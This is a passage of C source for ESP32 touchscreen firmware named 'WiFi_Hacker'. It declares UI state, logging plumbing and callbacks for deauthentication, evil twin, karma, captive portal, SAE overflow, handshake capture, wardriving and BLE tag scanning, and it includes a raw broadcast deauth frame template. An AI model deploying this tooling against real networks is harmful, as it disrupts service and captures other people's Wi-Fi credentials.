#include <stdio.h>
#include "lvgl.h"
#include "esp_lcd_panel_io.h"
#include "esp_lcd_panel_vendor.h"
#include "esp_lcd_panel_ops.h"
#include "esp_lcd_ili9341.h"
#include "ft6336.h"
#include "driver/spi_master.h"
#include "driver/i2c.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/queue.h"
#include "esp_timer.h"
#include "esp_log.h"
#include "esp_heap_caps.h"
#include <string.h>
#include <stdarg.h>
#include <stdint.h>
#include <stdlib.h>
#include "esp_event.h"
#include "freertos/semphr.h"
#include "wifi_cli.h"
#include "wifi_scanner.h"
#include "wifi_sniffer.h"
#include "wifi_attacks.h"
#include "wifi_wardrive.h"
#include "attack_handshake.h"
#include "lvgl_memory.h"
#include <sys/unistd.h>
#include <sys/reent.h>
#include <dirent.h>
#include <sys/stat.h>
#include "esp_rom_sys.h"
#include "esp_task_wdt.h"

// GPS
#include "driver/uart.h"

// NimBLE (BLE scanner)
#include "nimble/nimble_port.h"
#include "nimble/nimble_port_freertos.h"
#include "host/ble_hs.h"

#define TAG "WiFi_Hacker"

// ============================================================================
// Radio Mode Management (WiFi <-> BLE switching)
// ============================================================================
typedef enum {
    RADIO_MODE_NONE,
    RADIO_MODE_WIFI,
    RADIO_MODE_BLE
} radio_mode_t;

static radio_mode_t current_radio_mode = RADIO_MODE_NONE;
static bool wifi_initialized = false;

// ============================================================================
// BLE Scanner state (NimBLE)
// ============================================================================

// Apple Company ID (Little Endian)
#define APPLE_COMPANY_ID        0x004C
// Samsung Company ID (Little Endian)
#define SAMSUNG_COMPANY_ID      0x0075
// Apple Find My Network device type (AirTag, AirPods, etc.)
#define APPLE_FIND_MY_TYPE      0x12

// BLE scan state
static volatile bool bt_scan_active = false;
static TaskHandle_t bt_scan_task_handle = NULL;
static volatile bool nimble_initialized = false;

// BLE device tracking for deduplication
#define BT_MAX_DEVICES 128
static uint8_t bt_found_devices[BT_MAX_DEVICES][6];
static int bt_found_device_count = 0;

// AirTag/SmartTag counters
static int bt_airtag_count = 0;
static int bt_smarttag_count = 0;

// Generic BT device storage for scan_bt command
typedef struct {
    uint8_t addr[6];
    int8_t rssi;
    char name[32];
    uint16_t company_id;
    bool is_airtag;
    bool is_smarttag;
} bt_device_info_t;

static bt_device_info_t bt_devices[BT_MAX_DEVICES];
static int bt_device_count = 0;

// ============================================================================

// Pin configuration
#define LCD_MOSI 24
#define LCD_MISO 4
#define LCD_CLK  23
#define LCD_CS   6//13//15
#define LCD_DC   3
#define LCD_RST  2  

// Capacitive touch I2C pins (FT6336U)
#define CTP_SDA  9
#define CTP_SCL  10
#define CTP_INT  25
#define CTP_RST  8

#define LCD_H_RES 480
#define LCD_V_RES 320
#define LCD_HOST SPI2_HOST

// Color definitions (used throughout the file)
#define COLOR_MATERIAL_BLUE     lv_color_make(33, 150, 243)    // #2196F3 - default text color
#define COLOR_MATERIAL_RED      lv_color_make(244, 67, 54)     // #F44336 - error/stop color
#define COLOR_DARK_BLUE         lv_color_make(15, 60, 100)     // Dark blue for pressed states

typedef int (*vprintf_like_t)(const char *, va_list);

static lv_disp_draw_buf_t draw_buf;
static lv_color_t *buf1 = NULL;
static lv_color_t *buf2 = NULL;
static SemaphoreHandle_t lvgl_mutex = NULL;
SemaphoreHandle_t sd_spi_mutex = NULL;  // Mutex for SD/SPI access (shared with display) - used by attack_handshake.c
static volatile bool touch_pressed_flag = false;
static volatile uint16_t touch_x_flag = 0;
static volatile uint16_t touch_y_flag = 0;
static volatile bool show_touch_dot = true;
static volatile bool ui_locked = false;
static volatile bool nav_to_menu_flag = false;

static esp_lcd_panel_handle_t panel_handle;
static ft6336_handle_t touch_handle;
static lv_obj_t *touch_dot;  // DEBUG: visual touch indicator
static lv_obj_t *title_bar;
static lv_obj_t *function_page = NULL;

// Use GPS definitions from wifi_common.h via wifi_cli.h
static gps_data_t current_gps = {0};
static char gps_rx_buffer[GPS_BUF_SIZE];
static StaticTask_t gps_task_buffer;
static StackType_t *gps_task_stack = NULL;

// SD init task buffers
static StaticTask_t sd_init_task_buffer;
static StackType_t *sd_init_task_stack = NULL;

static esp_err_t init_gps_uart(void);
static bool parse_gps_nmea(const char *nmea_sentence);
static void gps_task(void *arg);

// Route ESP logging directly to ROM UART to avoid VFS write paths during GUI/ISR contexts
static int rom_vprintf(const char *fmt, va_list ap)
{
	char buf[256];
	int len = vsnprintf(buf, sizeof(buf), fmt, ap);
	if (len > 0) {
		if (len < (int)sizeof(buf)) {
			esp_rom_printf("%s", buf);
		} else {
			// Truncate safely to avoid heap/VFS usage
			esp_rom_printf("%.*s", (int)sizeof(buf) - 1, buf);
		}
	}
	return len;
}

// Scanner UI state
static volatile bool scan_done_ui_flag = false;
#define SCAN_RESULTS_MAX_DISPLAY 32

// Whitelist for BSSID protection
#define MAX_WHITELISTED_BSSIDS 150
typedef struct {
    uint8_t bssid[6];
} whitelisted_bssid_t;
whitelisted_bssid_t whiteListedBssids[MAX_WHITELISTED_BSSIDS];
int whitelistedBssidsCount = 0;

static lv_obj_t *scan_status_label = NULL;
static lv_obj_t *scan_list = NULL;
static lv_obj_t *deauth_list = NULL;
static lv_obj_t *deauth_prompt_label = NULL;
static lv_obj_t *deauth_fps_label = NULL;
static lv_obj_t *deauth_pause_btn = NULL;
static lv_obj_t *deauth_quit_btn = NULL;
static volatile bool deauth_stop_flag = false;
static volatile bool deauth_resume_flag = false;
static volatile bool deauth_paused = false;
static volatile uint32_t lvgl_flush_counter = 0;

// Deauth rescan feature - periodic channel verification
static volatile bool deauth_rescan_pending = false;
static volatile bool deauth_rescan_active = false;
static volatile bool deauth_rescan_done_flag = false;  // Separate flag for rescan completion
static esp_timer_handle_t deauth_rescan_timer = NULL;
#define DEAUTH_RESCAN_INTERVAL_MS 180000  // 3 minutes
static uint8_t deauth_target_bssids[MAX_SCAN_RESULTS][6];
static uint8_t deauth_target_channels[MAX_SCAN_RESULTS];
static int deauth_target_count = 0;

static lv_obj_t *evil_twin_network_dd = NULL;
static lv_obj_t *evil_twin_html_dd = NULL;
static lv_obj_t *evil_twin_start_btn = NULL;
static lv_obj_t *evil_twin_status_label = NULL;
static lv_obj_t *evil_twin_log_ta = NULL;
static lv_obj_t *evil_twin_content = NULL;
static int evil_twin_network_map[SCAN_RESULTS_MAX_DISPLAY];
static int evil_twin_network_count = 0;
static int evil_twin_html_map[SCAN_RESULTS_MAX_DISPLAY];
static int evil_twin_html_count = 0;

// Evil Twin new UI elements
static lv_obj_t *evil_twin_ssid_label = NULL;
static lv_obj_t *evil_twin_deauth_list_label = NULL;
static lv_obj_t *evil_twin_status_list = NULL;
static char evil_twin_current_ssid[33] = "";

typedef struct {
    char text[160];
} evil_log_msg_t;

// Evil Twin event queue for UI updates
static QueueHandle_t evil_twin_event_queue = NULL;

static QueueHandle_t evil_twin_log_queue = NULL;
static bool evil_twin_log_capture_enabled = false;
static vprintf_like_t previous_vprintf = NULL;

// Blackout UI state
static lv_obj_t *blackout_log_ta = NULL;
static lv_obj_t *blackout_stop_btn = NULL;
static QueueHandle_t blackout_log_queue = NULL;
static bool blackout_log_capture_enabled = false;
static volatile bool blackout_ui_active = false;

// Snifferdog UI state
static lv_obj_t *snifferdog_log_ta = NULL;
static lv_obj_t *snifferdog_stop_btn = NULL;
static QueueHandle_t snifferdog_log_queue = NULL;
static bool snifferdog_log_capture_enabled = false;
static volatile bool snifferdog_ui_active = false;

// Snifferdog attack state (from original project)
static TaskHandle_t sniffer_dog_task_handle = NULL;
static StaticTask_t sniffer_dog_task_buffer;
static StackType_t *sniffer_dog_task_stack = NULL;
static volatile bool sniffer_dog_active = false;
static int sniffer_dog_current_channel = 1;
static int sniffer_dog_channel_index = 0;
static int64_t sniffer_dog_last_channel_hop = 0;
static const int sniffer_channel_hop_delay_ms = 250;

// Sniffer UI state
static lv_obj_t *sniffer_log_ta = NULL;
static lv_obj_t *sniffer_stop_btn = NULL;
static QueueHandle_t sniffer_log_queue = NULL;
static bool sniffer_log_capture_enabled = false;
static volatile bool sniffer_ui_active = false;

// Sniffer task state
static TaskHandle_t sniffer_task_handle = NULL;
static StaticTask_t sniffer_task_buffer;
static StackType_t *sniffer_task_stack = NULL;
static volatile bool sniffer_task_active = false;

// SAE Overflow UI state
static lv_obj_t *sae_overflow_log_ta = NULL;
static lv_obj_t *sae_overflow_stop_btn = NULL;
static QueueHandle_t sae_overflow_log_queue = NULL;
static bool sae_overflow_log_capture_enabled = false;
static volatile bool sae_overflow_ui_active = false;

// Handshake UI state
static lv_obj_t *handshake_log_ta = NULL;
static lv_obj_t *handshake_stop_btn = NULL;
static QueueHandle_t handshake_log_queue = NULL;
static bool handshake_log_capture_enabled = false;
static volatile bool handshake_ui_active = false;

// Handshake attack state
static TaskHandle_t handshake_attack_task_handle = NULL;
static StaticTask_t handshake_attack_task_buffer;
static StackType_t *handshake_attack_task_stack = NULL;
static volatile bool handshake_attack_active = false;
static bool handshake_selected_mode = false;
static wifi_ap_record_t handshake_targets[MAX_AP_CNT];
static int handshake_target_count = 0;
static bool handshake_captured[MAX_AP_CNT];
static int handshake_current_index = 0;

// Wardrive UI state
static lv_obj_t *wardrive_log_ta = NULL;
static lv_obj_t *wardrive_stop_btn = NULL;
static QueueHandle_t wardrive_log_queue = NULL;
static bool wardrive_log_capture_enabled = false;
static volatile bool wardrive_ui_active = false;

// Wardrive attack state (from original project)
static TaskHandle_t wardrive_task_handle = NULL;
static StaticTask_t wardrive_task_buffer;
static StackType_t *wardrive_task_stack = NULL;
static volatile bool wardrive_active = false;
static int wardrive_file_counter = 1;

// Wardrive buffers (static to avoid stack overflow)
static char wardrive_gps_buffer[GPS_BUF_SIZE];
static wifi_ap_record_t wardrive_scan_results[MAX_AP_CNT];

// Karma UI state
static lv_obj_t *karma_log_ta = NULL;
static lv_obj_t *karma_stop_btn = NULL;
static lv_obj_t *karma_content = NULL;
static lv_obj_t *karma_probe_dd = NULL;
static lv_obj_t *karma_html_dd = NULL;
static lv_obj_t *karma_start_btn = NULL;
static QueueHandle_t karma_log_queue = NULL;
static bool karma_log_capture_enabled = false;
static volatile bool karma_ui_active = false;

// Portal UI state
static lv_obj_t *portal_content = NULL;
static lv_obj_t *portal_ssid_ta = NULL;
static lv_obj_t *portal_html_dd = NULL;
static lv_obj_t *portal_start_btn = NULL;
static lv_obj_t *portal_keyboard = NULL;
static char portal_ssid_buffer[33] = "Free WiFi";

// BLE Scan UI state
static lv_obj_t *ble_scan_content = NULL;
static lv_obj_t *ble_scan_list = NULL;
static lv_obj_t *ble_scan_status_label = NULL;
static volatile bool ble_scan_ui_active = false;
static volatile bool ble_scan_needs_ui_update = false;
static volatile bool ble_scan_finished = false;
static char ble_scan_status_text[48] = "";

// Dual-band channel list (2.4GHz + 5GHz)
static const int dual_band_channels[] = {
    // 2.4GHz channels
    1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14,
    // 5GHz channels
    36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128,
    132, 136, 140, 144, 149, 153, 157, 161, 165
};
static const int dual_band_channels_count = sizeof(dual_band_channels) / sizeof(dual_band_channels[0]);

// Promiscuous filter
static const wifi_promiscuous_filter_t sniffer_filter = {
    .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA
};

// Deauth frame template
static const uint8_t deauth_frame_default[] = {
    0xC0, 0x00,                         // Type/Subtype: Deauthentication
    0x00, 0x00,                         // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Broadcast MAC
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Sender (BSSID AP)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID AP
    0x00, 0x00,                         // Seq Control
    0x01, 0x00                          // Reason: Unspecified
};

static void scan_checkbox_event_cb(lv_event_t *e);
void lvgl_flush_cb(lv_disp_drv_t *drv, const lv_area_t *area, lv_color_t *color_p);
void lvgl_touch_read_cb(lv_indev_drv_t *indev_drv, lv_indev_data_t *data);
void attack_event_cb(lv_event_t *e);
void menu_event_cb(lv_event_t *e);
lv_obj_t *create_menu_item(lv_obj_t *parent, const char *icon, const char *text);
lv_obj_t *create_clickable_item(lv_obj_t *parent, const char *icon, const char *text, lv_event_cb_t callback, const char *user_data);
void show_function_page(const char *name);
void show_menu(void);
void back_to_menu_cb(lv_event_t *e);

// Tile-based navigation system
static lv_obj_t *tiles_container = NULL;
static lv_obj_t *create_tile(lv_obj_t *parent, const char *icon, const char *text, lv_color_t bg_color, lv_event_cb_t callback, const char *user_data);
static void show_main_tiles(void);
static void show_wifi_scan_attack_screen(void);
static void show_attack_tiles_screen(void);
static void show_global_attacks_screen(void);
static void show_sniff_karma_screen(void);
static void show_wifi_monitor_screen(void);
static void show_bluetooth_screen(void);
static void show_stub_screen(const char *name);
static void main_tile_event_cb(lv_event_t *e);
static void attack_tile_event_cb(lv_event_t *e);
static void home_btn_event_cb(lv_event_t *e);
static void wifi_scan_next_btn_cb(lv_event_t *e);
static void deauth_quit_event_cb(lv_event_t *e);
static void deauth_rescan_timer_stop(void);

// Reset all child pointers when function_page is deleted
static void reset_function_page_children(void) {
    scan_status_label = NULL;
    scan_list = NULL;
    deauth_list = NULL;
    deauth_prompt_label = NULL;
    deauth_fps_label = NULL;
    deauth_pause_btn = NULL;
    deauth_quit_btn = NULL;
    evil_twin_network_dd = NULL;
    evil_twin_html_dd = NULL;
    evil_twin_start_btn = NULL;
    evil_twin_status_label = NULL;
    evil_twin_log_ta = NULL;
    evil_twin_content = NULL;
    evil_twin_ssid_label = NULL;
    evil_twin_deauth_list_label = NULL;
    evil_twin_status_list = NULL;
    blackout_log_ta = NULL;
    blackout_stop_btn = NULL;
    snifferdog_log_ta = NULL;
    snifferdog_stop_btn = NULL;
    sniffer_log_ta = NULL;
    sniffer_stop_btn = NULL;
    sae_overflow_log_ta = NULL;
    sae_overflow_stop_btn = NULL;
    handshake_log_ta = NULL;
    handshake_stop_btn = NULL;
    wardrive_log_ta = NULL;
    wardrive_stop_btn = NULL;
    karma_log_ta = NULL;
    karma_stop_btn = NULL;
    karma_content = NULL;
    karma_probe_dd = NULL;
    karma_html_dd = NULL;
    karma_start_btn = NULL;
    portal_content = NULL;
    portal_ssid_ta = NULL;
    portal_html_dd = NULL;
    portal_start_btn = NULL;
    portal_keyboard = NULL;
    ble_scan_content = NULL;
    ble_scan_list = NULL;
    ble_scan_status_label = NULL;
}

static void create_function_page_base(const char *name);
void show_function_page(const char *name);
static void show_evil_twin_page(void);
static void evil_twin_start_btn_cb(lv_event_t *e);
static esp_err_t evil_twin_enable_log_capture(void);
static void evil_twin_ui_event_callback(evil_twin_event_data_t *data);
static void evil_twin_disable_log_capture(void);
static void blackout_yes_btn_cb(lv_event_t *e);
static void blackout_stop_btn_cb(lv_event_t *e);
static esp_err_t blackout_enable_log_capture(void);
static void blackout_disable_log_capture(void);
static void snifferdog_yes_btn_cb(lv_event_t *e);
static void snifferdog_stop_btn_cb(lv_event_t *e);
static esp_err_t snifferdog_enable_log_capture(void);
static void snifferdog_disable_log_capture(void);
static void sniffer_yes_btn_cb(lv_event_t *e);
static void sniffer_enough_btn_cb(lv_event_t *e);
static esp_err_t sniffer_enable_log_capture(void);
static void sniffer_disable_log_capture(void);
static void sniffer_task(void *pvParameters);
static void sae_overflow_yes_btn_cb(lv_event_t *e);
static void sae_overflow_stop_btn_cb(lv_event_t *e);
static esp_err_t sae_overflow_enable_log_capture(void);
static void sae_overflow_disable_log_capture(void);
static void handshake_yes_btn_cb(lv_event_t *e);
static void handshake_stop_btn_cb(lv_event_t *e);
static esp_err_t handshake_enable_log_capture(void);
static void handshake_disable_log_capture(void);
static void handshake_attack_task(void *pvParameters);
static void attack_network_with_burst(const wifi_ap_record_t *ap);
static bool check_handshake_file_exists(const char *ssid);
static void handshake_cleanup(void);
static void sniffer_dog_channel_hop(void);
static void sniffer_dog_task(void *pvParameters);
static void sniffer_dog_promiscuous_callback(void *buf, wifi_promiscuous_pkt_type_t type);
static void wardrive_start_btn_cb(lv_event_t *e);
static void wardrive_stop_btn_cb(lv_event_t *e);
static esp_err_t wardrive_enable_log_capture(void);
static void wardrive_disable_log_capture(void);
static void wardrive_task(void *pvParameters);
static void show_karma_page(void);
static void karma_start_btn_cb(lv_event_t *e);
static void karma_stop_btn_cb(lv_event_t *e);
static esp_err_t karma_enable_log_capture(void);
static void karma_disable_log_capture(void);
static void show_portal_page(void);
static void portal_ssid_ta_event_cb(lv_event_t *e);
static void portal_keyboard_event_cb(lv_event_t *e);
static void portal_start_btn_cb(lv_event_t *e);
static void portal_keyboard_event_cb(lv_event_t *e);
static void get_timestamp_string(char* buffer, size_t size);
static const char* get_auth_mode_wiggle(wifi_auth_mode_t mode);
static bool wait_for_gps_fix(int timeout_seconds);
void load_whitelist_from_sd(void);
bool is_bssid_whitelisted(const uint8_t *bssid);

// Radio mode switching (WiFi <-> BLE)
static bool ensure_wifi_mode(void);
static bool ensure_ble_mode(void);

// NimBLE BLE scanner functions
static esp_err_t bt_nimble_init(void);
static void bt_nimble_deinit(void);
static void bt_scan_stop(void);
static void bt_scan_task(void *pvParameters);
static int bt_gap_event_callback(struct ble_gap_event *event, void *arg);
static void bt_on_sync(void);
static void bt_on_reset(int reason);
static void nimble_host_task(void *param);
static int bt_start_scan(void);
static void bt_stop_scan(void);
static bool bt_is_device_found(const uint8_t *addr);
static int bt_find_device_index(const uint8_t *addr);
static void bt_add_found_device(const uint8_t *addr);
static void bt_reset_counters(void);
static void bt_format_addr(const uint8_t *addr, char *str);
static bool bt_is_apple_airtag(const uint8_t *data, uint8_t len, bool has_name);
static bool bt_is_samsung_smarttag(const uint8_t *data, uint8_t len);

// BLE Scan UI
static void ble_scan_back_btn_cb(lv_event_t *e);
static void ble_scan_update_list(void);

static void wifi_scan_done_cb(void *arg, esp_event_base_t event_base, int32_t event_id, void *event_data)
{
    if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_SCAN_DONE) {
        // Use separate flag for deauth rescan to avoid conflicts
        if (deauth_rescan_active) {
            deauth_rescan_done_flag = true;
        } else {
            scan_done_ui_flag = true;
        }
    }
}

static void scan_checkbox_event_cb(lv_event_t *e)
{
    lv_obj_t *cb = lv_event_get_target(e);
    int index = (int)(intptr_t)lv_event_get_user_data(e);
    bool checked = lv_obj_has_state(cb, LV_STATE_CHECKED);
    wifi_scanner_select_network(index, checked);
}

static int dual_vprintf(const char *fmt, va_list ap)
{
    va_list ap_copy, ap_copy2, ap_copy3, ap_copy4, ap_copy5, ap_copy6, ap_copy7;
    va_copy(ap_copy, ap);
    va_copy(ap_copy2, ap);
    va_copy(ap_copy3, ap);
    va_copy(ap_copy4, ap);
    va_copy(ap_copy5, ap);
    va_copy(ap_copy6, ap);
    va_copy(ap_copy7, ap);

    int ret = rom_vprintf(fmt, ap);

    if (evil_twin_log_capture_enabled && evil_twin_log_queue) {
        evil_log_msg_t msg;
        int written = vsnprintf(msg.text, sizeof(msg.text), fmt, ap_copy);
        if (written > 0) {
            msg.text[sizeof(msg.text) - 1] = '\0';
            if (strstr(msg.text, "wifi_attacks:") != NULL) {
                xQueueSend(evil_twin_log_queue, &msg, 0);
            }
        }
    }

    if (blackout_log_capture_enabled && blackout_log_queue) {
        evil_log_msg_t msg;
        int written = vsnprintf(msg.text, sizeof(msg.text), fmt, ap_copy2);
        if (written > 0) {
            msg.text[sizeof(msg.text) - 1] = '\0';
            if (strstr(msg.text, "wifi_attacks:") != NULL) {
                xQueueSend(blackout_log_queue, &msg, 0);
            }
        }
    }

    if (snifferdog_log_capture_enabled && snifferdog_log_queue) {
        evil_log_msg_t msg;
        int written = vsnprintf(msg.text, sizeof(msg.text), fmt, ap_copy3);
        if (written > 0) {
            msg.text[sizeof(msg.text) - 1] = '\0';
            // Capture logs with TAG (WiFi_Hacker) that contain SnifferDog
            if (strstr(msg.text, "WiFi_Hacker:") != NULL && strstr(msg.text, "SnifferDog") != NULL) {
                xQueueSend(snifferdog_log_queue, &msg, 0);
            }
        }
    }

    if (sniffer_log_capture_enabled && sniffer_log_queue) {
        evil_log_msg_t msg;
        int written = vsnprintf(msg.text, sizeof(msg.text), fmt, ap_copy6);
        if (written > 0) {
            msg.text[sizeof(msg.text) - 1] = '\0';
            // Capture logs with TAG (wifi_sniffer)
            if (strstr(msg.text, "wifi_sniffer:") != NULL) {
                xQueueSend(sniffer_log_queue, &msg, 0);
            }
        }
    }

    if (sae_overflow_log_capture_enabled && sae_overflow_log_queue) {
        evil_log_msg_t msg;
        int written = vsnprintf(msg.text, sizeof(msg.text), fmt, ap_copy4);
        if (written > 0) {
            msg.text[sizeof(msg.text) - 1] = '\0';
            if (strstr(msg.text, "wifi_attacks:") != NULL) {
                xQueueSend(sae_overflow_log_queue, &msg, 0);
            }
        }
    }

    if (handshake_log_capture_enabled && handshake_log_queue) {
        evil_log_msg_t msg;
        int written = vsnprintf(msg.text, sizeof(msg.text), fmt, ap_copy5);
        if (written > 0) {
            msg.text[sizeof(msg.text) - 1] = '\0';
            // Capture logs from handshake attack task (WiFi_Hacker tag, but not SnifferDog)
            // Also capture logs from attack_handshake component
            if ((strstr(msg.text, "WiFi_Hacker:") != NULL && strstr(msg.text, "SnifferDog") == NULL) ||
                strstr(msg.text, "attack_handshake:") != NULL) {
                xQueueSend(handshake_log_queue, &msg, 0);
            }
        }
    }

    if (wardrive_log_capture_enabled && wardrive_log_queue) {
        evil_log_msg_t msg;
        int written = vsnprintf(msg.text, sizeof(msg.text), fmt, ap_copy5);
        if (written > 0) {
            msg.text[sizeof(msg.text) - 1] = '\0';
            // Capture logs with TAG (WiFi_Hacker) for Wardrive
            if (strstr(msg.text, "WiFi_Hacker:") != NULL) {
                xQueueSend(wardrive_log_queue, &msg, 0);
            }
        }
    }

    if (karma_log_capture_enabled && karma_log_queue) {
        evil_log_msg_t msg;
        int written = vsnprintf(msg.text, sizeof(msg.text), fmt, ap_copy7);
        if (written > 0) {
            msg.text[sizeof(msg.text) - 1] = '\0';
            if (strstr(msg.text, "wifi_attacks:") != NULL) {
                xQueueSend(karma_log_queue, &msg, 0);
            }
        }
    }
    va_end(ap_copy4);
    va_end(ap_copy5);
    va_end(ap_copy6);
    va_end(ap_copy7);

    va_end(ap_copy);
    va_end(ap_copy2);
    va_end(ap_copy3);
    return ret;
}

static esp_err_t evil_twin_enable_log_capture(void)
{
    if (!evil_twin_log_queue) {
        evil_twin_log_queue = xQueueCreate(32, sizeof(evil_log_msg_t));
        if (!evil_twin_log_queue) {
            return ESP_ERR_NO_MEM;
        }
    } else {
        xQueueReset(evil_twin_log_queue);
    }

    if (!evil_twin_log_capture_enabled) {
        if (!blackout_log_capture_enabled && !snifferdog_log_capture_enabled && !sniffer_log_capture_enabled && !sae_overflow_log_capture_enabled && !handshake_log_capture_enabled && !wardrive_log_capture_enabled && !karma_log_capture_enabled) {
            previous_vprintf = esp_log_set_vprintf(dual_vprintf);
        }
        evil_twin_log_capture_enabled = true;
    }

    return ESP_OK;
}

static void evil_twin_disable_log_capture(void)
{
    if (evil_twin_log_capture_enabled) {
        evil_twin_log_capture_enabled = false;
        if (!blackout_log_capture_enabled && !snifferdog_log_capture_enabled && !sniffer_log_capture_enabled && !sae_overflow_log_capture_enabled && !handshake_log_capture_enabled && !wardrive_log_capture_enabled && !karma_log_capture_enabled) {
        esp_log_set_vprintf(previous_vprintf ? previous_vprintf : rom_vprintf);
        previous_vprintf = NULL;
        }
    }

    if (evil_twin_log_queue) {
        xQueueReset(evil_twin_log_queue);
    }
}

// Evil Twin UI event callback - called from wifi_attacks task context
static void evil_twin_ui_event_callback(evil_twin_event_data_t *data) {
    if (evil_twin_event_queue && data) {
        // Queue event to be processed in main loop (thread-safe)
        xQueueSend(evil_twin_event_queue, data, 0);
    }
}

// Add status message to Evil Twin status list (must be called from main task)
static void evil_twin_add_status_message(const char *message, lv_color_t color) {
    if (evil_twin_status_list && lv_obj_is_valid(evil_twin_status_list)) {
        lv_obj_t *item = lv_list_add_text(evil_twin_status_list, message);
        if (item) {
            lv_obj_set_style_text_color(item, color, 0);
            lv_obj_set_style_bg_opa(item, LV_OPA_TRANSP, 0);
            lv_obj_set_style_pad_ver(item, 2, 0);
        }
        // Scroll to bottom
        lv_obj_scroll_to_y(evil_twin_status_list, LV_COORD_MAX, LV_ANIM_ON);
    }
}

static esp_err_t blackout_enable_log_capture(void)
{
    if (!blackout_log_queue) {
        blackout_log_queue = xQueueCreate(32, sizeof(evil_log_msg_t));
        if (!blackout_log_queue) {
            return ESP_ERR_NO_MEM;
        }
    } else {
        xQueueReset(blackout_log_queue);
    }

    if (!blackout_log_capture_enabled) {
        if (!evil_twin_log_capture_enabled && !snifferdog_log_capture_enabled && !sniffer_log_capture_enabled && !sae_overflow_log_capture_enabled && !handshake_log_capture_enabled && !wardrive_log_capture_enabled && !karma_log_capture_enabled) {
            previous_vprintf = esp_log_set_vprintf(dual_vprintf);
        }
        blackout_log_capture_enabled = true;
    }

    return ESP_OK;
}

static void blackout_disable_log_capture(void)
{
    if (blackout_log_capture_enabled) {
        blackout_log_capture_enabled = false;
        if (!evil_twin_log_capture_enabled && !snifferdog_log_capture_enabled && !sniffer_log_capture_enabled && !sae_overflow_log_capture_enabled && !handshake_log_capture_enabled && !wardrive_log_capture_enabled && !karma_log_capture_enabled) {
            esp_log_set_vprintf(previous_vprintf ? previous_vprintf : rom_vprintf);
            previous_vprintf = NULL;
        }
    }

    if (blackout_log_queue) {
        xQueueReset(blackout_log_queue);
    }
}

static esp_err_t snifferdog_enable_log_capture(void)
{
    if (!snifferdog_log_queue) {
        snifferdog_log_queue = xQueueCreate(32, sizeof(evil_log_msg_t));
        if (!snifferdog_log_queue) {
            return ESP_ERR_NO_MEM;
        }
    } else {
        xQueueReset(snifferdog_log_queue);
    }

    if (!snifferdog_log_capture_enabled) {
        if (!evil_twin_log_capture_enabled && !blackout_log_capture_enabled && !sniffer_log_capture_enabled && !sae_overflow_log_capture_enabled && !handshake_log_capture_enabled && !wardrive_log_capture_enabled && !karma_log_capture_enabled) {
            previous_vprintf = esp_log_set_vprintf(dual_vprintf);
        }
        snifferdog_log_capture_enabled = true;
    }

    return ESP_OK;
}

static void snifferdog_disable_log_capture(void)
{
    if (snifferdog_log_capture_enabled) {
        snifferdog_log_capture_enabled = false;
        if (!evil_twin_log_capture_enabled && !blackout_log_capture_enabled && !sniffer_log_capture_enabled && !sae_overflow_log_capture_enabled && !handshake_log_capture_enabled && !wardrive_log_capture_enabled && !karma_log_capture_enabled) {
            esp_log_set_vprintf(previous_vprintf ? previous_vprintf : rom_vprintf);
            previous_vprintf = NULL;
        }
    }

    if (snifferdog_log_queue) {
        xQueueReset(snifferdog_log_queue);
    }
}

static esp_err_t sniffer_enable_log_capture(void)
{
    if (!sniffer_log_queue) {
        sniffer_log_queue = xQueueCreate(32, sizeof(evil_log_msg_t));
        if (!sniffer_log_queue) {
            return ESP_ERR_NO_MEM;
        }
    } else {
        xQueueReset(sniffer_log_queue);
    }

    if (!sniffer_log_capture_enabled) {
        if (!evil_twin_log_capture_enabled && !blackout_log_capture_enabled && !snifferdog_log_capture_enabled && !sae_overflow_log_capture_enabled && !handshake_log_capture_enabled && !wardrive_log_capture_enabled && !karma_log_capture_enabled) {
            previous_vprintf = esp_log_set_vprintf(dual_vprintf);
        }
        sniffer_log_capture_enabled = true;
    }

    return ESP_OK;
}

static void sniffer_disable_log_capture(void)
{
    if (sniffer_log_capture_enabled) {
        sniffer_log_capture_enabled = false;
        if (!evil_twin_log_capture_enabled && !blackout_log_capture_enabled && !snifferdog_log_capture_enabled && !sae_overflow_log_capture_enabled && !handshake_log_capture_enabled && !wardrive_log_capture_enabled && !karma_log_capture_enabled) {
            esp_log_set_vprintf(previous_vprintf ? previous_vprintf : rom_vprintf);
            previous_vprintf = NULL;
        }
    }

    if (sniffer_log_queue) {
        xQueueReset(sniffer_log_queue);
    }
}

static esp_err_t sae_overflow_enable_log_capture(void)
{
    if (!sae_overflow_log_queue) {
        sae_overflow_log_queue = xQueueCreate(32, sizeof(evil_log_msg_t));
        if (!sae_overflow_log_queue) {
            return ESP_ERR_NO_MEM;
        }
    } else {
        xQueueReset(sae_overflow_log_queue);
    }

    if (!sae_overflow_log_capture_enabled) {
        if (!evil_twin_log_capture_enabled && !blackout_log_capture_enabled && !snifferdog_log_capture_enabled && !sniffer_log_capture_enabled && !handshake_log_capture_enabled && !wardrive_log_capture_enabled && !karma_log_capture_enabled) {
            previous_vprintf = esp_log_set_vprintf(dual_vprintf);
        }
        sae_overflow_log_capture_enabled = true;
    }

    return ESP_OK;
}

static void sae_overflow_disable_log_capture(void)
{
    if (sae_overflow_log_capture_enabled) {
        sae_overflow_log_capture_enabled = false;
        if (!evil_twin_log_capture_enabled && !blackout_log_capture_enabled && !snifferdog_log_capture_enabled && !sniffer_log_capture_enabled && !wardrive_log_capture_enabled && !karma_log_capture_enabled && !handshake_log_capture_enabled) {
            esp_log_set_vprintf(previous_vprintf ? previous_vprintf : rom_vprintf);
            previous_vprintf = NULL;
        }
    }

    if (sae_overflow_log_queue) {
        xQueueReset(sae_overflow_log_queue);
    }
}

static esp_err_t handshake_enable_log_capture(void)
{
    if (handshake_log_queue == NULL) {
        handshake_log_queue = xQueueCreate(20, sizeof(evil_log_msg_t));
        if (handshake_log_queue == NULL) {
            return ESP_FAIL;
        }
    }

    if (!handshake_log_capture_enabled) {
